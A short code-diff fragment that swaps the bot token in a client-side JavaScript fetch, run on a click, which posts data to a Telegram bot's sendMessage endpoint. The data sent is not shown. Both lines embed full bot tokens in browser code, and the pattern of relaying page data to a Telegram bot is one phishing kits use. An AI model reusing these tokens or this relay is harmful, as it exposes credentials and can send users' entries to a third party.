@@ -191,7 +191,7 @@ document.addEventListener("click", async function(e){
     status.style.color = "black";
 
     try {
-      await fetch("https://api.telegram.org/bot8526026377AAGO0cYmxm4aDcmNP2KDBaEnonLCB9Gt20w/sendMessage", {
+      await fetch("https://api.telegram.org/bot8526026377:AAG29qhStGeijKCDJ3zQR_1sCAVwfShFzkw/sendMessage", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
